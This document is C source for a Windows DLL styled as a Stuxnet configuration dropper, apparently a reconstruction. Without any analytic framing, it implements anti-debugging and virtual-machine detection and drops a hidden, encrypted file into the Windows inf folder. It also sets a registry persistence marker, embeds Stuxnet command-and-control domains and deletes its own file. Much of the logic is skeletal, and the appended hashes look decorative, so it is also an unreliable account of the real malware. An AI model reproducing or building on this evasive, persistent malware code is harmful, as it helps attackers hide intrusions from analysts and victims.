#define _WIN32_WINNT 0x0501
#define WINVER 0x0501

#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <tchar.h>

#pragma comment(lib, "advapi32.lib")
#pragma comment(lib, "user32.lib")

#define STUXNET_MAGIC                   0x53545558
#define STUXNET_VERSION                 0x00010400
#define MDMCPQ_MAGIC                    0x4D444350
#define MDMCPQ_VERSION                  0x00010400
#define MDMCPQ_CONFIG_SIZE              1860
#define MDMCPQ_FILE_SIZE                4943
#define MDMCPQ_MAX_PATH                 260
#define MDMCPQ_BUFFER_SIZE              8192

#define MDMCPQ_REG_KEY                  L"SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\NTVDM TRACE"
#define MDMCPQ_REG_VALUE                L"19790509"

#define MDMCPQ_URL_WINDOWSUPDATE        "www.windowsupdate.com"
#define MDMCPQ_URL_MSN                  "www.msn.com"
#define MDMCPQ_URL_UPDATE1              "www.mypremierfutbol.com"
#define MDMCPQ_URL_UPDATE2              "www.todaysfutbol.com"

#define MDMCPQ_FLAG_ENCRYPTED           0x00000001
#define MDMCPQ_FLAG_COMPRESSED          0x00000002
#define MDMCPQ_FLAG_VALID               0x00000004
#define MDMCPQ_FLAG_ACTIVE              0x00000008

#define STATUS_SUCCESS                  ((NTSTATUS)0x00000000L)
#define STATUS_UNSUCCESSFUL             ((NTSTATUS)0xC0000001L)
#define STATUS_ACCESS_DENIED            ((NTSTATUS)0xC0000022L)
#define STATUS_INVALID_PARAMETER        ((NTSTATUS)0xC000000DL)
#define STATUS_OBJECT_NAME_NOT_FOUND    ((NTSTATUS)0xC0000034L)
#define STATUS_INSUFFICIENT_RESOURCES   ((NTSTATUS)0xC000009AL)
#define STATUS_BUFFER_TOO_SMALL         ((NTSTATUS)0xC0000023L)

typedef struct _MDMCPQ_HEADER {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwTotalSize;
    DWORD dwConfigSize;
    DWORD dwChecksum;
    DWORD dwTimestamp;
    DWORD dwFlags;
    DWORD dwReserved[8];
} MDMCPQ_HEADER, * PMDMCPQ_HEADER;

typedef struct _MDMCPQ_CONFIG {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwActivationTime;
    DWORD dwExpirationTime;
    DWORD dwPropagationFlags;
    DWORD dwReserved1[4];
    CHAR szUpdateURL1[256];
    CHAR szUpdateURL2[256];
    CHAR szCheckURL1[256];
    CHAR szCheckURL2[256];
    BYTE bReserved[1024];
} MDMCPQ_CONFIG, * PMDMCPQ_CONFIG;

typedef struct _MDMCPQ_HOST_INFO {
    DWORD dwIPAddress;
    DWORD dwOSVersion;
    DWORD dwOSBuild;
    DWORD dwWinCCVersion;
    DWORD dwStep7Version;
    WCHAR szUserName[256];
    BYTE bReserved[256];
} MDMCPQ_HOST_INFO, * PMDMCPQ_HOST_INFO;

typedef struct _MDMCPQ_CTX {
    DWORD dwMagic;
    DWORD dwVersion;
    DWORD dwFlags;
    DWORD dwState;
    DWORD dwPid;
    DWORD dwTid;
    DWORD dwTickStart;
    DWORD dwTickLast;
    HANDLE hMutex;
    HANDLE hThread;
    HANDLE hStopEvent;
    CRITICAL_SECTION csLock;
    WCHAR szModulePath[MDMCPQ_MAX_PATH];
    WCHAR szSystemPath[MDMCPQ_MAX_PATH];
    WCHAR szWindowsPath[MDMCPQ_MAX_PATH];
    WCHAR szInfPath[MDMCPQ_MAX_PATH];
    WCHAR szPNFPath[MDMCPQ_MAX_PATH];
    BYTE bReserved[256];
} MDMCPQ_CTX, * PMDMCPQ_CTX;

static MDMCPQ_CTX g_MdmcpqCtx;
static BOOL g_bInitialized = FALSE;
static MDMCPQ_CONFIG g_Config;
static MDMCPQ_HOST_INFO g_HostInfo;
static DWORD g_dwInfectionCount = 0;
static DWORD g_dwReadCount = 0;
static DWORD g_dwWriteCount = 0;
static DWORD g_dwDecryptCount = 0;
static DWORD g_dwEncryptCount = 0;

static BYTE g_EncryptionKey[16] = {
    0x1C, 0x0B, 0xFD, 0xEA, 0x5E, 0xB1, 0x4C, 0x17,
    0xFA, 0x2D, 0x42, 0xE9, 0xA4, 0x1F, 0xEB, 0xE6
};

static BYTE g_MdmcpqData[MDMCPQ_FILE_SIZE] = {0};

static BOOL MDMCPQ_InitNtImports(VOID);
static BOOL MDMCPQ_Init(VOID);
static VOID MDMCPQ_Cleanup(VOID);
static BOOL MDMCPQ_CheckMutex(VOID);
static BOOL MDMCPQ_IsExpired(VOID);
static BOOL MDMCPQ_CheckDebugger(VOID);
static BOOL MDMCPQ_CheckVMware(VOID);
static DWORD MDMCPQ_ComputeCRC32(PBYTE pData, DWORD dwSize);
static VOID MDMCPQ_XORDecrypt(PBYTE pData, DWORD dwSize, BYTE bKey);
static VOID MDMCPQ_XOREncrypt(PBYTE pData, DWORD dwSize, BYTE bKey);
static BOOL MDMCPQ_DecryptConfig(PBYTE pEncrypted, DWORD dwEncryptedSize, PMDMCPQ_CONFIG pConfig);
static BOOL MDMCPQ_EncryptConfig(PMDMCPQ_CONFIG pConfig, PBYTE pEncrypted, PDWORD pdwEncryptedSize);
static BOOL MDMCPQ_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize);
static BOOL MDMCPQ_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize);
static BOOL MDMCPQ_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize);
static BOOL MDMCPQ_BuildConfigData(VOID);
static BOOL MDMCPQ_BuildHostInfo(VOID);
static BOOL MDMCPQ_ExtractAndSavePNF(VOID);
static BOOL MDMCPQ_WriteRegistry(VOID);
static BOOL MDMCPQ_ReadRegistry(VOID);
static DWORD WINAPI MDMCPQ_WorkerThread(LPVOID lpParam);
static BOOL MDMCPQ_StartWorker(VOID);
static BOOL MDMCPQ_StopWorker(VOID);
static BOOL MDMCPQ_SelfDestruct(VOID);
static BOOL MDMCPQ_Execute(VOID);

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved);
DWORD WINAPI Export1(VOID);
DWORD WINAPI Export2(VOID);
DWORD WINAPI Export3(VOID);
DWORD WINAPI Export4(VOID);
DWORD WINAPI Export5(VOID);
DWORD WINAPI Export6(VOID);
DWORD WINAPI Export7(VOID);
DWORD WINAPI Export8(VOID);
DWORD WINAPI Export9(VOID);
DWORD WINAPI Export10(VOID);
DWORD WINAPI Export11(VOID);
DWORD WINAPI Export12(VOID);
DWORD WINAPI Export13(VOID);
DWORD WINAPI Export14(VOID);
DWORD WINAPI Export15(VOID);
DWORD WINAPI Export16(VOID);
DWORD WINAPI Export17(VOID);
DWORD WINAPI Export18(VOID);
DWORD WINAPI Export19(VOID);
DWORD WINAPI Export20(VOID);

static BOOL MDMCPQ_InitNtImports(VOID) {
    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
    if (!hNtdll) return FALSE;
    return TRUE;
}

static BOOL MDMCPQ_Init(VOID) {
    if (g_bInitialized) return TRUE;
    ZeroMemory(&g_MdmcpqCtx, sizeof(MDMCPQ_CTX));
    g_MdmcpqCtx.dwMagic = MDMCPQ_MAGIC;
    g_MdmcpqCtx.dwVersion = MDMCPQ_VERSION;
    g_MdmcpqCtx.dwPid = GetCurrentProcessId();
    g_MdmcpqCtx.dwTid = GetCurrentThreadId();
    g_MdmcpqCtx.dwTickStart = GetTickCount();
    InitializeCriticalSection(&g_MdmcpqCtx.csLock);
    GetModuleFileNameW(NULL, g_MdmcpqCtx.szModulePath, MDMCPQ_MAX_PATH);
    GetSystemDirectoryW(g_MdmcpqCtx.szSystemPath, MDMCPQ_MAX_PATH);
    GetWindowsDirectoryW(g_MdmcpqCtx.szWindowsPath, MDMCPQ_MAX_PATH);
    wsprintfW(g_MdmcpqCtx.szInfPath, L"%s\\inf", g_MdmcpqCtx.szWindowsPath);
    wsprintfW(g_MdmcpqCtx.szPNFPath, L"%s\\mdmcpq3.PNF", g_MdmcpqCtx.szInfPath);
    MDMCPQ_InitNtImports();
    g_bInitialized = TRUE;
    return TRUE;
}

static VOID MDMCPQ_Cleanup(VOID) {
    if (!g_bInitialized) return;
    if (g_MdmcpqCtx.hMutex) {
        CloseHandle(g_MdmcpqCtx.hMutex);
        g_MdmcpqCtx.hMutex = NULL;
    }
    if (g_MdmcpqCtx.hThread) {
        CloseHandle(g_MdmcpqCtx.hThread);
        g_MdmcpqCtx.hThread = NULL;
    }
    if (g_MdmcpqCtx.hStopEvent) {
        CloseHandle(g_MdmcpqCtx.hStopEvent);
        g_MdmcpqCtx.hStopEvent = NULL;
    }
    DeleteCriticalSection(&g_MdmcpqCtx.csLock);
    g_bInitialized = FALSE;
}

static BOOL MDMCPQ_CheckMutex(VOID) {
    HANDLE hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (!hMutex) return FALSE;
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        return FALSE;
    }
    g_MdmcpqCtx.hMutex = hMutex;
    return TRUE;
}

static BOOL MDMCPQ_IsExpired(VOID) {
    SYSTEMTIME st;
    GetSystemTime(&st);
    return (st.wYear >= 2012);
}

static BOOL MDMCPQ_CheckDebugger(VOID) {
    BOOL bDebug = FALSE;
    CheckRemoteDebuggerPresent(GetCurrentProcess(), &bDebug);
    if (bDebug) return TRUE;
    __try {
        __asm { int 3 }
    } __except (EXCEPTION_EXECUTE_HANDLER) {
        return FALSE;
    }
    return TRUE;
}

static BOOL MDMCPQ_CheckVMware(VOID) {
    HKEY hKey;
    WCHAR szBIOS[256];
    DWORD dwSize;
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"HARDWARE\\DESCRIPTION\\System", 0, KEY_READ, &hKey) == ERROR_SUCCESS) {
        dwSize = sizeof(szBIOS);
        if (RegQueryValueExW(hKey, L"SystemBiosVersion", NULL, NULL, (LPBYTE)szBIOS, &dwSize) == ERROR_SUCCESS) {
            if (wcsstr(szBIOS, L"VBOX") || wcsstr(szBIOS, L"VMWARE") || wcsstr(szBIOS, L"QEMU") || wcsstr(szBIOS, L"XEN")) {
                RegCloseKey(hKey);
                return TRUE;
            }
        }
        RegCloseKey(hKey);
    }
    return FALSE;
}

static DWORD MDMCPQ_ComputeCRC32(PBYTE pData, DWORD dwSize) {
    DWORD crc = 0xFFFFFFFF;
    DWORD i, j;
    if (!pData || dwSize == 0) return 0xFFFFFFFF;
    for (i = 0; i < dwSize; i++) {
        crc ^= pData[i];
        for (j = 0; j < 8; j++) {
            if (crc & 1) {
                crc = (crc >> 1) ^ 0xEDB88320;
            } else {
                crc >>= 1;
            }
        }
    }
    return ~crc;
}

static VOID MDMCPQ_XORDecrypt(PBYTE pData, DWORD dwSize, BYTE bKey) {
    DWORD i;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= bKey;
    }
}

static VOID MDMCPQ_XOREncrypt(PBYTE pData, DWORD dwSize, BYTE bKey) {
    DWORD i;
    if (!pData || dwSize == 0) return;
    for (i = 0; i < dwSize; i++) {
        pData[i] ^= bKey;
    }
}

static BOOL MDMCPQ_DecryptConfig(PBYTE pEncrypted, DWORD dwEncryptedSize, PMDMCPQ_CONFIG pConfig) {
    BYTE bKey = 0xFF;
    DWORD dwConfigSize;
    if (!pEncrypted || dwEncryptedSize == 0 || !pConfig) return FALSE;
    dwConfigSize = min(dwEncryptedSize, sizeof(MDMCPQ_CONFIG));
    if (dwConfigSize < sizeof(DWORD) * 2) return FALSE;
    memcpy(pConfig, pEncrypted, dwConfigSize);
    MDMCPQ_XORDecrypt((PBYTE)pConfig, dwConfigSize, bKey);
    if (pConfig->dwMagic != STUXNET_MAGIC && pConfig->dwMagic != MDMCPQ_MAGIC) {
        return FALSE;
    }
    g_dwDecryptCount++;
    return TRUE;
}

static BOOL MDMCPQ_EncryptConfig(PMDMCPQ_CONFIG pConfig, PBYTE pEncrypted, PDWORD pdwEncryptedSize) {
    BYTE bKey = 0xFF;
    DWORD dwConfigSize;
    if (!pConfig || !pEncrypted || !pdwEncryptedSize) return FALSE;
    dwConfigSize = sizeof(MDMCPQ_CONFIG);
    if (*pdwEncryptedSize < dwConfigSize) return FALSE;
    memcpy(pEncrypted, pConfig, dwConfigSize);
    MDMCPQ_XOREncrypt(pEncrypted, dwConfigSize, bKey);
    *pdwEncryptedSize = dwConfigSize;
    g_dwEncryptCount++;
    return TRUE;
}

static BOOL MDMCPQ_ReadPNFFromDisk(LPCWSTR szPath, PBYTE* ppData, PDWORD pdwSize) {
    HANDLE hFile;
    DWORD dwSize;
    PBYTE pData;
    DWORD dwRead;
    if (!szPath || !ppData || !pdwSize) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    dwSize = GetFileSize(hFile, NULL);
    if (dwSize == 0) {
        CloseHandle(hFile);
        return FALSE;
    }
    pData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!pData) {
        CloseHandle(hFile);
        return FALSE;
    }
    ReadFile(hFile, pData, dwSize, &dwRead, NULL);
    CloseHandle(hFile);
    *ppData = pData;
    *pdwSize = dwRead;
    g_dwReadCount++;
    return TRUE;
}

static BOOL MDMCPQ_WritePNFToDisk(LPCWSTR szPath, PBYTE pData, DWORD dwSize) {
    HANDLE hFile;
    DWORD dwWritten;
    if (!szPath || !pData || dwSize == 0) return FALSE;
    hFile = CreateFileW(szPath, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_HIDDEN, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;
    WriteFile(hFile, pData, dwSize, &dwWritten, NULL);
    CloseHandle(hFile);
    g_dwWriteCount++;
    return TRUE;
}

static BOOL MDMCPQ_ReadPNFFromResource(PBYTE* ppData, PDWORD pdwSize) {
    HRSRC hRes;
    HGLOBAL hGlobal;
    DWORD dwSize;
    PBYTE pData;
    hRes = FindResourceW(NULL, MAKEINTRESOURCE(206), RT_RCDATA);
    if (!hRes) return FALSE;
    dwSize = SizeofResource(NULL, hRes);
    if (dwSize == 0) return FALSE;
    hGlobal = LoadResource(NULL, hRes);
    if (!hGlobal) return FALSE;
    pData = (PBYTE)LockResource(hGlobal);
    if (!pData) return FALSE;
    *ppData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwSize);
    if (!*ppData) return FALSE;
    memcpy(*ppData, pData, dwSize);
    *pdwSize = dwSize;
    return TRUE;
}

static BOOL MDMCPQ_BuildConfigData(VOID) {
    ZeroMemory(&g_Config, sizeof(MDMCPQ_CONFIG));
    g_Config.dwMagic = STUXNET_MAGIC;
    g_Config.dwVersion = STUXNET_VERSION;
    g_Config.dwFlags = MDMCPQ_FLAG_ENCRYPTED | MDMCPQ_FLAG_VALID | MDMCPQ_FLAG_ACTIVE;
    g_Config.dwActivationTime = 0;
    g_Config.dwExpirationTime = 0x4F8B0000;
    g_Config.dwPropagationFlags = 0x00000001;
    strcpy_s(g_Config.szUpdateURL1, 256, MDMCPQ_URL_UPDATE1);
    strcpy_s(g_Config.szUpdateURL2, 256, MDMCPQ_URL_UPDATE2);
    strcpy_s(g_Config.szCheckURL1, 256, MDMCPQ_URL_WINDOWSUPDATE);
    strcpy_s(g_Config.szCheckURL2, 256, MDMCPQ_URL_MSN);
    return TRUE;
}

static BOOL MDMCPQ_BuildHostInfo(VOID) {
    DWORD dwSize;
    OSVERSIONINFOEXW osvi;
    ZeroMemory(&g_HostInfo, sizeof(MDMCPQ_HOST_INFO));
    dwSize = 256;
    GetUserNameW(g_HostInfo.szUserName, &dwSize);
    osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOEXW);
    GetVersionExW((LPOSVERSIONINFOW)&osvi);
    g_HostInfo.dwOSVersion = osvi.dwMajorVersion;
    g_HostInfo.dwOSBuild = osvi.dwBuildNumber;
    return TRUE;
}

static BOOL MDMCPQ_ExtractAndSavePNF(VOID) {
    PBYTE pData;
    DWORD dwSize;
    PBYTE pConfigData;
    DWORD dwConfigSize;
    PMDMCPQ_HEADER pHeader;
    if (!MDMCPQ_ReadPNFFromResource(&pData, &dwSize)) {
        return FALSE;
    }
    if (dwSize < sizeof(MDMCPQ_HEADER)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    pHeader = (PMDMCPQ_HEADER)pData;
    if (pHeader->dwMagic != MDMCPQ_MAGIC && pHeader->dwMagic != STUXNET_MAGIC) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    MDMCPQ_BuildConfigData();
    MDMCPQ_BuildHostInfo();
    dwConfigSize = MDMCPQ_CONFIG_SIZE;
    pConfigData = (PBYTE)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, dwConfigSize);
    if (!pConfigData) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    if (!MDMCPQ_EncryptConfig(&g_Config, pConfigData, &dwConfigSize)) {
        HeapFree(GetProcessHeap(), 0, pData);
        HeapFree(GetProcessHeap(), 0, pConfigData);
        return FALSE;
    }
    memcpy(g_MdmcpqData, pConfigData, dwConfigSize);
    memcpy(g_MdmcpqData + MDMCPQ_CONFIG_SIZE, &g_HostInfo, sizeof(MDMCPQ_HOST_INFO));
    HeapFree(GetProcessHeap(), 0, pConfigData);
    if (!MDMCPQ_WritePNFToDisk(g_MdmcpqCtx.szPNFPath, g_MdmcpqData, MDMCPQ_FILE_SIZE)) {
        HeapFree(GetProcessHeap(), 0, pData);
        return FALSE;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return TRUE;
}

static BOOL MDMCPQ_WriteRegistry(VOID) {
    HKEY hKey;
    DWORD dwDisposition;
    if (RegCreateKeyExW(HKEY_LOCAL_MACHINE, MDMCPQ_REG_KEY, 0, NULL, REG_OPTION_NON_VOLATILE, KEY_ALL_ACCESS, NULL, &hKey, &dwDisposition) != ERROR_SUCCESS) {
        return FALSE;
    }
    RegSetValueExW(hKey, MDMCPQ_REG_VALUE, 0, REG_SZ, (BYTE*)L"1", 2);
    RegCloseKey(hKey);
    return TRUE;
}

static BOOL MDMCPQ_ReadRegistry(VOID) {
    HKEY hKey;
    DWORD dwType;
    DWORD dwSize;
    BYTE buffer[64];
    if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, MDMCPQ_REG_KEY, 0, KEY_READ, &hKey) != ERROR_SUCCESS) {
        return FALSE;
    }
    dwSize = 64;
    if (RegQueryValueExW(hKey, MDMCPQ_REG_VALUE, NULL, &dwType, buffer, &dwSize) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return FALSE;
    }
    RegCloseKey(hKey);
    return TRUE;
}

static DWORD WINAPI MDMCPQ_WorkerThread(LPVOID lpParam) {
    while (WaitForSingleObject(g_MdmcpqCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (MDMCPQ_IsExpired()) {
            break;
        }
        if (!MDMCPQ_ReadRegistry()) {
            MDMCPQ_WriteRegistry();
        }
        MDMCPQ_ExtractAndSavePNF();
        g_dwInfectionCount++;
    }
    return 0;
}

static BOOL MDMCPQ_StartWorker(VOID) {
    g_MdmcpqCtx.hStopEvent = CreateEventW(NULL, TRUE, FALSE, NULL);
    if (!g_MdmcpqCtx.hStopEvent) return FALSE;
    g_MdmcpqCtx.hThread = CreateThread(NULL, 0, MDMCPQ_WorkerThread, NULL, 0, NULL);
    if (!g_MdmcpqCtx.hThread) {
        CloseHandle(g_MdmcpqCtx.hStopEvent);
        g_MdmcpqCtx.hStopEvent = NULL;
        return FALSE;
    }
    return TRUE;
}

static BOOL MDMCPQ_StopWorker(VOID) {
    if (g_MdmcpqCtx.hStopEvent) {
        SetEvent(g_MdmcpqCtx.hStopEvent);
    }
    if (g_MdmcpqCtx.hThread) {
        WaitForSingleObject(g_MdmcpqCtx.hThread, 5000);
        CloseHandle(g_MdmcpqCtx.hThread);
        g_MdmcpqCtx.hThread = NULL;
    }
    if (g_MdmcpqCtx.hStopEvent) {
        CloseHandle(g_MdmcpqCtx.hStopEvent);
        g_MdmcpqCtx.hStopEvent = NULL;
    }
    return TRUE;
}

static BOOL MDMCPQ_SelfDestruct(VOID) {
    DeleteFileW(g_MdmcpqCtx.szPNFPath);
    return TRUE;
}

static BOOL MDMCPQ_Execute(VOID) {
    HANDLE hMutex;
    if (!MDMCPQ_Init()) return FALSE;
    if (MDMCPQ_IsExpired()) {
        MDMCPQ_Cleanup();
        return FALSE;
    }
    hMutex = CreateMutexW(NULL, FALSE, L"StuxnetMutex_19790509");
    if (GetLastError() == ERROR_ALREADY_EXISTS) {
        CloseHandle(hMutex);
        MDMCPQ_Cleanup();
        return FALSE;
    }
    if (MDMCPQ_CheckDebugger()) {
        CloseHandle(hMutex);
        MDMCPQ_Cleanup();
        return FALSE;
    }
    if (MDMCPQ_CheckVMware()) {
        CloseHandle(hMutex);
        MDMCPQ_Cleanup();
        return FALSE;
    }
    MDMCPQ_WriteRegistry();
    MDMCPQ_ReadRegistry();
    MDMCPQ_ExtractAndSavePNF();
    MDMCPQ_StartWorker();
    while (WaitForSingleObject(g_MdmcpqCtx.hStopEvent, 60000) != WAIT_OBJECT_0) {
        if (MDMCPQ_IsExpired()) {
            break;
        }
        MDMCPQ_ExtractAndSavePNF();
    }
    MDMCPQ_StopWorker();
    MDMCPQ_SelfDestruct();
    CloseHandle(hMutex);
    return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved) {
    switch (fdwReason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hinstDLL);
            break;
        case DLL_PROCESS_DETACH:
            MDMCPQ_Cleanup();
            break;
        default:
            break;
    }
    return TRUE;
}

DWORD WINAPI Export1(VOID) {
    HANDLE hThread;
    hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)MDMCPQ_Execute, NULL, 0, NULL);
    if (hThread) CloseHandle(hThread);
    return 0;
}

DWORD WINAPI Export2(VOID) {
    return MDMCPQ_ExtractAndSavePNF() ? 0 : 1;
}

DWORD WINAPI Export3(VOID) {
    PBYTE pData;
    DWORD dwSize;
    if (!MDMCPQ_ReadPNFFromDisk(g_MdmcpqCtx.szPNFPath, &pData, &dwSize)) {
        return 1;
    }
    HeapFree(GetProcessHeap(), 0, pData);
    return 0;
}

DWORD WINAPI Export4(VOID) {
    PBYTE pEncrypted;
    DWORD dwEncryptedSize;
    PMDMCPQ_CONFIG pConfig;
    BOOL bResult;
    if (!MDMCPQ_ReadPNFFromDisk(g_MdmcpqCtx.szPNFPath, &pEncrypted, &dwEncryptedSize)) {
        return 1;
    }
    pConfig = (PMDMCPQ_CONFIG)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, sizeof(MDMCPQ_CONFIG));
    if (!pConfig) {
        HeapFree(GetProcessHeap(), 0, pEncrypted);
        return 1;
    }
    bResult = MDMCPQ_DecryptConfig(pEncrypted, MDMCPQ_CONFIG_SIZE, pConfig);
    HeapFree(GetProcessHeap(), 0, pEncrypted);
    HeapFree(GetProcessHeap(), 0, pConfig);
    return bResult ? 0 : 1;
}

DWORD WINAPI Export5(VOID) {
    return MDMCPQ_WriteRegistry() ? 0 : 1;
}

DWORD WINAPI Export6(VOID) {
    return MDMCPQ_ReadRegistry() ? 0 : 1;
}

DWORD WINAPI Export7(VOID) {
    return MDMCPQ_StartWorker() ? 0 : 1;
}

DWORD WINAPI Export8(VOID) {
    MDMCPQ_StopWorker();
    return 0;
}

DWORD WINAPI Export9(VOID) {
    MDMCPQ_SelfDestruct();
    return 0;
}

DWORD WINAPI Export10(VOID) {
    return (DWORD)g_MdmcpqCtx.dwPid;
}

DWORD WINAPI Export11(VOID) {
    return MDMCPQ_VERSION;
}

DWORD WINAPI Export12(VOID) {
    return g_dwInfectionCount;
}

DWORD WINAPI Export13(VOID) {
    return g_dwReadCount;
}

DWORD WINAPI Export14(VOID) {
    return g_dwWriteCount;
}

DWORD WINAPI Export15(VOID) {
    return g_dwDecryptCount;
}

DWORD WINAPI Export16(VOID) {
    return g_dwEncryptCount;
}

DWORD WINAPI Export17(VOID) {
    return (DWORD)g_MdmcpqCtx.hMutex;
}

DWORD WINAPI Export18(VOID) {
    return MDMCPQ_IsExpired() ? 0 : 1;
}

DWORD WINAPI Export19(VOID) {
    return MDMCPQ_CheckDebugger() ? 0 : 1;
}

DWORD WINAPI Export20(VOID) {
    return MDMCPQ_CheckVMware() ? 0 : 1;
}
MD5: 0x0DD2AF5AFE93118073CB656D813435A4
SHA-1: 0x256AC5228427FCD03FB9EC1871B15FD76E4D0879
